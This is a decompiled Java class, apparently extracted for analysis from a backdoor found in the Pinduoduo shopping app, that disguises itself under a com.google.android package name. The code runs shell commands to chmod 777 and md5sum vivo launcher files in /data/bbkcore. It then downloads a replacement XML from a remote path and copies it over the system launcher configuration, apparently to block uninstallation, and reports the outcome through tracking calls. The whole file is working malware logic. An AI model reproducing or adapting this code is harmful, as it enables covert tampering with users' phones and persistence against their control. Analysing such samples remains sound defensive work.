package com.google.android.sd.biz_dynamic_dex.vivo_rollback_uninstall;

import android.content.Context;
import android.os.Build;
import android.text.TextUtils;
import com.google.android.sd.biz_dynamic_dex.a.a;
import com.google.android.sd.biz_dynamic_dex.base.DynamicCmdExecutor;
import com.google.android.sd.cmd.CmdData;
import com.google.android.sd.cmd.CmdHandler;
import com.google.android.sd.utils.TrackUtils;
import com.google.android.sd.utils.Utils;
import java.io.File;
import java.util.HashMap;
import java.util.Map;
import org.json.JSONException;
import org.json.JSONObject;

public class VivoRollbackUninstallExecutor extends DynamicCmdExecutor {
  private final String a = "/data/bbkcore/BBKLauncher2_custom_%s.xml";
  
  private HashMap<Integer, String> b = new HashMap<Integer, String>();
  
  private HashMap<Integer, String> c = new HashMap<Integer, String>();
  
  private HashMap<Integer, String> d = new HashMap<Integer, String>();
  
  private String e;
  
  private int a() {
    int i = Build.VERSION.SDK_INT;
    Integer integer1 = Integer.valueOf(3507);
    integer2 = Integer.valueOf(2751);
    Integer integer3 = Integer.valueOf(1946);
    Integer integer4 = Integer.valueOf(1221);
    Integer integer5 = Integer.valueOf(1220);
    Integer integer6 = Integer.valueOf(507);
    Integer integer7 = Integer.valueOf(2304);
    Integer integer8 = Integer.valueOf(2303);
    Integer integer9 = Integer.valueOf(1948);
    Integer integer10 = Integer.valueOf(1223);
    if (i >= 30) {
      this.b.put(integer10, "ea3c53c24a61c1525c6902115d5a6f5d");
      this.b.put(integer9, "bb4af7c41fd8292e0139fde60d706d4c");
      this.b.put(integer8, "038393fabe4cfab5321a677fdc78b701");
      this.b.put(integer7, "2ae317ed4878af26249f25bc941efb45");
      this.b.put(integer1, "cb3be0b0a6d8a2e7e53eefe4d4e46dca");
    } else {
      this.b.put(integer6, "b79a16900b6f91fd004d22387ef3b47e");
      this.b.put(integer5, "06100eda5750badbb5fcd89bcbea6d38");
      this.b.put(integer4, "f9a7d5d068577538901783b192720800");
      this.b.put(integer10, "8ba543a1aefebfaa13187f9ab7202a96");
      this.b.put(integer3, "91ab6a0b29e4a0175f792e232baf2922");
      this.b.put(integer9, "75bc643a7d7e7cf393edf1b60de95921");
      this.b.put(integer8, "2af6be62047289d43b57bb18cd6723bf");
      this.b.put(integer7, "b53cabf3df5122ee48c8732c5aec0764");
      this.b.put(integer2, "c35ce886277459da756c097e07cd8871");
    } 
    if (Build.VERSION.SDK_INT >= 30) {
      this.c.put(integer10, "dfc583837962910fb0f92b3f6a03d917");
      this.c.put(integer9, "cedb670e508911590509b81ca0e0c560");
      this.c.put(integer8, "8cb2cdf69c364a35a4872d68a3ea8223");
      this.c.put(integer7, "8ddce584f2082f52ed06e2971bd309d6");
      this.c.put(integer1, "65b8fec83a0944c8fee20197f5bfa319");
    } else {
      this.c.put(integer6, "f69c264291a684338b6de40793d93ca5");
      this.c.put(integer5, "4831dae78045897b3ee9d4e4b14c09ab");
      this.c.put(integer4, "fe78b912c7feb95a32127ab56c0075d9");
      this.c.put(integer10, "56a41f0650dde5e24a98a750a8e58246");
      this.c.put(integer3, "c11b137d5cff7632a23c2213511e0870");
      this.c.put(integer9, "31d402db994d478966dd0c72bdead2a2");
      this.c.put(integer8, "76bf2d4cfc655ef6e3f5721af9dec461");
      this.c.put(integer7, "2b7a141406d673b7edb9db3dc4d73b61");
      this.c.put(integer2, "1a2f4590ede3e472dd1772a235251ca4");
    } 
    if (Build.VERSION.SDK_INT >= 30) {
      this.d.put(integer10, "/vivo/b10e2b62-e110-409e-9f0d-040d3b6d7068.xml");
      this.d.put(integer9, "/vivo/f22d6e6d-ccfa-4f27-bfc1-2a31a1c7928e.xml");
      this.d.put(integer8, "/vivo/552132e7-d4a1-4aca-9f9f-a5e811c1c1db.xml");
      this.d.put(integer7, "/vivo/dd1b970d-40bb-48f6-a8bb-4c9aa91f0220.xml");
      this.d.put(integer1, "/vivo/2ddcdfad-f4c5-4bf1-a632-2daa5897b0cc.xml");
    } else {
      this.d.put(integer6, "/vivo/5e89d67c-e28a-42b7-b118-f34c9263e356.xml");
      this.d.put(integer5, "/vivo/55243815-396f-4c8c-bca6-40aa4e57467b.xml");
      this.d.put(integer4, "/vivo/0344fe04-b523-4e03-9daa-12eaa44fef25.xml");
      this.d.put(integer10, "/vivo/8d46754e-7556-48de-9420-62471d468f46.xml");
      this.d.put(integer3, "/vivo/2acd520e-d587-45bf-8d42-39d3b47458e1.xml");
      this.d.put(integer9, "/vivo/32ce77bb-2162-4c24-8264-c0dbdaa5fd3f.xml");
      this.d.put(integer8, "/vivo/4435c5e5-d0f3-4512-b42f-8b9d4bb5d9f1.xml");
      this.d.put(integer7, "/vivo/6757c1d2-4379-47ad-83b0-1c046707f046.xml");
      this.d.put(integer2, "/vivo/682b4b95-1d5c-45e1-b81c-12d732e952f5.xml");
    } 
    for (Integer integer2 : this.b.keySet()) {
      String str = String.format("/data/bbkcore/BBKLauncher2_custom_%s.xml", new Object[] { integer2 });
      a.a("chmod 777 ".concat(String.valueOf(str)));
      str = a.a("md5sum ".concat(String.valueOf(str)));
      if (!TextUtils.isEmpty(str) && str.contains(String.valueOf(this.b.get(integer2))))
        return integer2.intValue(); 
    } 
    return -1;
  }
  
  private static Map<String, String> a(boolean paramBoolean, String paramString) {
    String str;
    HashMap<Object, Object> hashMap = new HashMap<Object, Object>();
    if (paramBoolean) {
      hashMap.put("status", "1");
      str = "true";
    } else {
      hashMap.put("status", "0");
      str = "false";
    } 
    hashMap.put("result", str);
    hashMap.put("details", paramString);
    return (Map)hashMap;
  }
  
  private void a(Context paramContext, String paramString) {
    CmdHandler.dispatch(paramContext, Utils.buildErrorRespData(new CmdData(1032, this.e, "client"), paramString, null));
    TrackUtils.submitTrack(paramContext, 1032, a(false, paramString));
  }
  
  public void realExecute(Context paramContext, String paramString) {
    String str;
    if (TextUtils.isEmpty(paramString)) {
      paramString = "input is empty";
    } else {
      try {
        this.e = (new JSONObject(paramString)).optString("uuid");
        int i = a();
        if (i != -1) {
          if (paramContext.getPackageManager().checkPermission("android.permission.WRITE_SECURE_SETTINGS", paramContext.getPackageName()) == -1) {
            a(paramContext, "no permission");
            return;
          } 
          File file = new File("sdcard", String.format("BBKLauncher2_custom_%s.xml", new Object[] { Integer.valueOf(i) }));
          try {
            Utils.downloadFile(paramContext, "1", this.d.get(Integer.valueOf(i)), file, this.c.get(Integer.valueOf(i)));
            String str1 = String.format("/data/bbkcore/BBKLauncher2_custom_%s.xml", new Object[] { Integer.valueOf(i) });
            StringBuilder stringBuilder = new StringBuilder("cp -r ");
            stringBuilder.append(file.getAbsolutePath());
            stringBuilder.append(" ");
            stringBuilder.append(String.format("/data/bbkcore/BBKLauncher2_custom_%s.xml", new Object[] { Integer.valueOf(i) }));
            String str2 = a.a(stringBuilder.toString());
            if (a.a("md5sum ".concat(String.valueOf(str1))).contains(this.c.get(Integer.valueOf(i)))) {
              JSONObject jSONObject = new JSONObject();
              CmdData cmdData = new CmdData(1032, this.e, "client");
              try {
                jSONObject.put("details", "success");
                CmdHandler.dispatch(paramContext, Utils.buildSucceedRespData(cmdData, jSONObject, null));
                TrackUtils.submitTrack(paramContext, 1032, a(true, "success"));
              } catch (JSONException jSONException) {
                CmdHandler.dispatch(paramContext, Utils.buildErrorRespData(cmdData, jSONException.toString(), null));
                TrackUtils.submitTrack(paramContext, 1032, a(false, "success"));
              } 
            } else {
              a(paramContext, "replace fail: ".concat(String.valueOf(jSONException)));
            } 
            file.delete();
            return;
          } catch (Exception exception) {
            a(paramContext, exception.getMessage());
            file.delete();
            return;
          } 
        } 
        a(paramContext, "no excepted id");
        return;
      } catch (Exception exception) {
        str = exception.getMessage();
      } 
    } 
    a(paramContext, str);
  }
}


/* Location:              C:\Users\daimiaopeng\Downloads\pinduoduo_backdoor-main\pinduoduo_backdoor-main\dex\d643e0f9a68342bc8403a69e7ee877a7-dex2jar.jar!\com\google\android\sd\biz_dynamic_dex\vivo_rollback_uninstall\VivoRollbackUninstallExecutor.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */